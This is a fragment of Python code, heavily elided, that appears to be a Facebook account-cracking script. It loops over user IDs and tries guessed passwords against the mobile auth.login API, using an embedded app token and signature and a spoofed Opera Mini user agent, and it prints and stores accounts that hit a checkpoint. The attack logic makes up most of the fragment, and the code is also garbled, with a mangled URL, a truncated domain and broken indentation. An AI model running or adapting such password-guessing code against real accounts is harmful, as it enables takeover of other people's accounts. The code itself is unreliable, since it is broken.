...
br.addheaders = [('User-Agent','Opera/9.80 (khalid; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
...
def pb():
	...
	def main(arg):
		...
		user=arg
		try:
			h=requests.get('+user+'/?access_token='+tb)
			j=json.loads(h.text)
			ps1=('878444')
			    ...
			    if 'access_token' in k:
			        ...
			        if 'www.facebook.com' in k['error_msg']:
			            ...
			            if 'access_token' in k:
			                ...
			                dt=urllib.urlopen('https://b-api./method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                k=json.load(dt)
			                if '' in k['error_msg']:
			                    print(S+'[CP] ♡ '+user+' ♡ '+ps3)
			                    cps.append(user+ps3)
